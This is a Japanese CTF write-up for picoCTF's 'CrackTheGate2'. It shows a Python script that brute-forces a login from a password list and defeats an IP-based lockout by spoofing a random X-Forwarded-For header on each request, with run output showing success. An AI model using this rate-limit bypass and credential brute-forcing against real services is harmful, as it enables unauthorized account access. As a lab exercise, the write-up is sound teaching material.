---
title: 'CrackTheGate2 - picoCTF'
description: 'Crack The Gate2のWriteupです。'
pubDate: 2025-12-21
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web']
---

# CrackTheGate2 - picoCTF

## Initial observation

前回の続き[CrackTheGate1](https://blog.towaos.com/p/crackthegate1-picoctf/)\
今回はパスワードリストをもとにパスワードを特定する。\
しかし、2回失敗するとロックアウトされるためこれを回避する。

**＊ この問題には欠点があり、失敗すると20分待たないと行けないはずが送信できてしまうためブルートフォース攻撃が可能になっている。**

## Objective of this initiative
今回の狙いは、クライアントIPを検証しており、同じIPが失敗するとロックアウトするというものなので、前回の問題と同様に *HTTP Header* を悪用した攻撃と考えた。

- `X-Forwarded-For` (X-Forwarded-For: 10.0.0.1)
- `X-Real-IP` (X-Real-IP: 10.0.0.1)
- `Forwarded` (Forwarded: for=10.0.0.1; proto=https; by=192.0.2.1
)

などが挙げられる。

## Acquisition of flag

```python
import requests
from random import *
from urllib.parse import *

URL = "http://challenge-host"

passwd_list = [
  "FvQqRDID",
  "o28yxJnz",
  "dzXLq6iI",
  "gQwoROCU",
  "TqdQCjNn",
  "VJSDcyso",
  "wCLZCkww",
  "GxjOadW5",
  "3pcv6C7j",
  "F0v4Jsmr",
  "y9JoEDYm",
  "QKCdmMKy",
  "fnW92UyB",
  "eMy1d5JZ",
  "eturI0N3",
  "pBT4eP6k",
  "o1QeNZ3M",
  "hdd1CWXH",
  "R6flYmhD",
  "cRdawYlr",
]

for i in range(len(passwd_list)):
  headers = {
    "X-Forwarded-For": f"{randint(1,223)}.{randint(0,255)}.{randint(0,255)}.{randint(1,254)}"
  }
  data = {
    "email":"ctf-player@picoctf.org",
    "password":passwd_list[i]
  }
  endpoint = "/login"

  req = requests.post(urljoin(URL, endpoint), headers=headers,json=data)
  res = req.json()

  # 実際はなくて良いが検証のため
  print(res)

  if res.get("success", True):
    crack_pass = passwd_list[i]
    flag = res.get("flag")
    break

print(crack_pass)
print(flag)
```

```bash
$ python3 exploit.py
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': False}
{'success': True, 'email': 'ctf-player@picoctf.org', 'firstName': 'pico', 'lastName': 'player', 'flag': 'picoCTF{***}'}
QKCdmMKy
picoCTF{***}

# 他のHeaderを使用した場合 (送信できるので成功はする)
python3 exploit.py
{'success': False}
{'success': False, 'error': 'Too many failed attempts. Please try again in 20 minutes.'}
...
```
結果:\
 `X-Forwarded-For` だとFalseが出力されており、ランダムなIPアドレスを使用して回避、実行できている。